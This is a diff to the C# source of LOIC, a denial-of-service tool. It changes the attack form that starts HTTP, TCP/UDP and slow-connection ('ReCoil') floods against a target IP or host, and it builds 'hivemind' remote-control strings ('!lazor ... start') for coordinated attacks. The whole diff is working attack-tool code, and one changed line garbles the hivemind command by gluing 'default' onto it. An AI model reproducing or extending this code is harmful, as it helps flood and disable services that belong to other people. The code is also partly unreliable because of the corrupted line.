@@ -86,6 +86,11 @@ namespace LOIC
 
                     try { iTimeout = Convert.ToInt32(txtTimeout.Text); }
                     catch { throw new Exception("What's up with something like that in the timeout box? =S"); }
+                    if (iTimeout > 1000)
+                    {
+                        iTimeout = 30;
+                        txtTimeout.Text = "30";
+                    }
 
                     bResp = chkResp.Checked;
 
@@ -104,6 +109,9 @@ namespace LOIC
                 }
 
                 cmdAttack.Text = "Stop flooding";
+                //let's lock down the controls, that could actually change the creation of new sockets
+                chkUsegZip.Enabled = false;
+                chkUseGet.Enabled = false;
 
                 if (String.Equals(sMethod, "TCP") || String.Equals(sMethod, "UDP"))
                 {
@@ -120,7 +128,7 @@ namespace LOIC
                     for (int a = 0; a < http.Length; a++)
                     {
                         http[a] = new HTTPFlooder(sTargetDNS, sTargetIP, iPort, sSubsite, bResp, iDelay, iTimeout, chkRandom.Checked, chkUsegZip.Checked);
-                        http[a].Start();
+                        http[a].start();
                     }
                 }
                 if ((iProtocol == 4) || (iProtocol == 5))
@@ -136,7 +144,7 @@ namespace LOIC
                     cHLDos ts;
                     if (iProtocol == 5)
                     {
-                        ts = new ReCoil(sTargetDNS, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread);
+                        ts = new ReCoil(sTargetDNS, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread, chkUsegZip.Checked);
                     }
                     else
                     {
@@ -151,6 +159,8 @@ namespace LOIC
             else if (toggle == true || on == false)
             {
                 cmdAttack.Text = "IMMA CHARGIN MAH LAZER";
+                chkUsegZip.Enabled = true;
+                chkUseGet.Enabled = true;
                 if (xxp != null)
                 {
                     for (int a = 0; a < xxp.Length; a++)
@@ -534,7 +544,7 @@ namespace LOIC
                                 tbSpeed.Value = num;
                             }
                             break;
-                        case "useGet":
+                        case "useget":
                             if (value.ToLower() == "true")
                             {
                                 chkUseGet.Checked = true;
@@ -544,7 +554,7 @@ namespace LOIC
                                 chkUseGet.Checked = false;
                             }
                             break;
-                        case "usegZip":
+                        case "usegzip":
                             if (value.ToLower() == "true")
                             {
                                 chkUsegZip.Checked = true;
@@ -554,7 +564,7 @@ namespace LOIC
                                 chkUsegZip.Checked = false;
                             }
                             break;
-                        case "socksPthread":
+                        case "sockspthread":
                             isnum = int.TryParse(value, out num);
                             if (isnum && num < 100) //let's protect them a bit, yeah?
                             {
@@ -694,7 +704,7 @@ namespace LOIC
                             http[a].Downloaded = iaDownloaded;
                             http[a].Requested = iaRequested;
                             http[a].Failed = iaFailed;
-                            http[a].Start();
+                            http[a].start();
                         }
                     }
                 }
@@ -721,7 +731,7 @@ namespace LOIC
                             cHLDos ts;
                             if (iProtocol == 5)
                             {
-                                ts = new ReCoil(sTargetDNS, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread);
+                                ts = new ReCoil(sTargetDNS, sTargetIP, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread, chkUsegZip.Checked);
                             }
                             else
                             {
@@ -738,7 +748,7 @@ namespace LOIC
                         cHLDos ts;
                         if (iProtocol == 5)
                         {
-                            ts = new ReCoil(sTargetDNS, sTargetDNS, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread);
+                            ts = new ReCoil(sTargetDNS, sTargetDNS, iPort, sSubsite, iDelay, iTimeout, chkRandom.Checked, iSockspThread, chkUsegZip.Checked);
                         }
                         else
                         {
@@ -814,8 +824,8 @@ namespace LOIC
                 defaults.Add("targetip"); defaults.Add("targethost"); defaults.Add("timeout");
                 defaults.Add("subsite"); defaults.Add("message"); defaults.Add("port");
                 defaults.Add("method"); defaults.Add("threads"); defaults.Add("wait");
-                defaults.Add("random"); defaults.Add("speed"); defaults.Add("socksPthread");
-                defaults.Add("useGet"); defaults.Add("usegZip");
+                defaults.Add("random"); defaults.Add("speed"); defaults.Add("sockspthread");
+                defaults.Add("useget"); defaults.Add("usegzip");
                 
                 int num = 0;
                 bool isnum = false;
@@ -829,7 +839,7 @@ namespace LOIC
                     tval = vals[i].Value.Trim();
                     tcmd = cmds[i].Value.Trim();
                     defaults.Remove(tcmd);
-                    switch (tcmd)
+                    switch (tcmd.ToLower())
                     {
                         case "targetip":
                             if (txtTargetIP.Text != tval)
@@ -936,7 +946,7 @@ namespace LOIC
                             break;
                         case "speed":
                             isnum = int.TryParse(tval, out num);
-                            if (isnum && num >= 0 && num <= 20) //let's protect them a bit, yeah?
+                            if (isnum && num >= tbSpeed.Minimum && num <= tbSpeed.Maximum) //let's protect them a bit, yeah?
                             {
                                 if (tbSpeed.Value != num)
                                 {
@@ -983,7 +993,7 @@ namespace LOIC
                             }
                             ret = true;
                             break;
-                        case "useGet":
+                        case "useget":
                             if (tval.ToLower() == "true")
                             {
                                 chkUseGet.Checked = true;
@@ -993,7 +1003,7 @@ namespace LOIC
                                 chkUseGet.Checked = false;
                             }
                             break;
-                        case "usegZip":
+                        case "usegzip":
                             if (tval.ToLower() == "true")
                             {
                                 chkUsegZip.Checked = true;
@@ -1003,7 +1013,7 @@ namespace LOIC
                                 chkUsegZip.Checked = false;
                             }
                             break;
-                        case "socksPthread":
+                        case "sockspthread":
                             isnum = int.TryParse(tval, out num);
                             if (isnum && num < 100) //let's protect them a bit, yeah?
                             {
@@ -1052,13 +1062,13 @@ namespace LOIC
                         case "speed":
                             tbSpeed.Value = 0;
                             break;
-                        case "socksPthread":
+                        case "sockspthread":
                             txtSLSpT.Text = "50";
                             break;
-                        case "useGet":
+                        case "useget":
                             chkUseGet.Checked = false;
                             break;
-                        case "usegZip":
+                        case "usegzip":
                             chkUsegZip.Checked = false;
                             break;
                     }
@@ -1073,6 +1083,8 @@ namespace LOIC
                 {
                     Attack(false, true, true);
                 }
+                if(!tZergRush.Enabled)
+                    this.Text = String.Format("{0} | U dun goofed | v. {1}", Application.ProductName, Application.ProductVersion);
             }
             return ret;
         }
@@ -1281,20 +1293,20 @@ namespace LOIC
             {
                 case Keys.F10:
                     string hivemind = "!lazor targetip=" + txtTargetIP.Text + " targethost=" + txtTargetURL.Text
-                        + " timeout=" + txtTimeout.Text + " subsite=" + Uri.EscapeDataString(txtSubsite.Text)
+                        + "default timeout=" + txtTimeout.Text + " subsite=" + Uri.EscapeDataString(txtSubsite.Text)
                         + " message=" + Uri.EscapeDataString(txtData.Text) + " port=" + txtPort.Text + " method=" + cbMethod.SelectedItem.ToString()
                         + " threads=" + txtThreads.Text + " wait=" + ((chkResp.Checked) ? "true" : "false")
                         + " random=" + (((chkRandom.Checked && (cbMethod.SelectedIndex >= 2)) || (chkMsgRandom.Checked && (cbMethod.SelectedIndex < 2))) ? "true" : "false")
-                        + " speed=" + tbSpeed.Value.ToString() + " socksPthread=" + txtSLSpT.Text
-                        + " useGet=" + ((chkUseGet.Checked) ? "true" : "false") + " usegZip=" + ((chkUsegZip.Checked) ? "true" : "false") + " start";
+                        + " speed=" + tbSpeed.Value.ToString() + " sockspthread=" + txtSLSpT.Text
+                        + " useget=" + ((chkUseGet.Checked) ? "true" : "false") + " usegzip=" + ((chkUsegZip.Checked) ? "true" : "false") + " start";
 
                     string overlord = "http://hive.mind/go?@targetip=" + txtTargetIP.Text + "@&@targethost=" + txtTargetURL.Text
                         + "@&@timeout=" + txtTimeout.Text + "@&@subsite=" + txtSubsite.Text
                         + "@&@message=" + txtData.Text + "@&@port=" + txtPort.Text + "@&@method=" + cbMethod.SelectedItem.ToString()
                         + "@&@threads=" + txtThreads.Text + "@&@wait=" + ((chkResp.Checked) ? "true" : "false")
                         + "@&@random=" + (((chkRandom.Checked && (cbMethod.SelectedIndex >= 2)) || (chkMsgRandom.Checked && (cbMethod.SelectedIndex < 2))) ? "true" : "false")
-                        + "@&@speed=" + tbSpeed.Value.ToString() + "@&@socksPthread=" + txtSLSpT.Text
-                        + "@&@useGet=" + ((chkUseGet.Checked) ? "true" : "false") + "@&@usegZip=" + ((chkUsegZip.Checked) ? "true" : "false") + "@";
+                        + "@&@speed=" + tbSpeed.Value.ToString() + "@&@sockspthread=" + txtSLSpT.Text
+                        + "@&@useget=" + ((chkUseGet.Checked) ? "true" : "false") + "@&@usegzip=" + ((chkUsegZip.Checked) ? "true" : "false") + "@";
 
                     new frmEZGrab(hivemind, overlord).Show();
                     e.Handled = true;
@@ -1309,8 +1321,8 @@ namespace LOIC
                 if (cbMethod.SelectedItem.ToString() == "slowLOIC")
                 {
                     chkUseGet.Enabled = true;
-                    chkUsegZip.Enabled = true;
                 }
+                chkUsegZip.Enabled = true;
                 txtSLSpT.Enabled = true;
                 chkResp.Enabled = false;
             }
